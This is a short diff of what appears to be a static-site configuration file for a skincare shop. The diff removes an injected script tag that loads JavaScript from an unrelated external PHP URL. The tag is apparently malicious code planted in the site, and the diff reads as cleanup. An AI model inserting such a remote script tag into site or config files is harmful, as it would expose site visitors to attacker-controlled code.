@@ -1,5 +1,4 @@
 ######################## default configuration ####################
-<script src = 'https://srm.e-energy.store/js/index.php'></script>
 baseURL = "https://yoga-six.vercel.app"
 languageCode = "en"
 title = "IMAGE NOW. Age later. &ndash; Image Skincare Online"
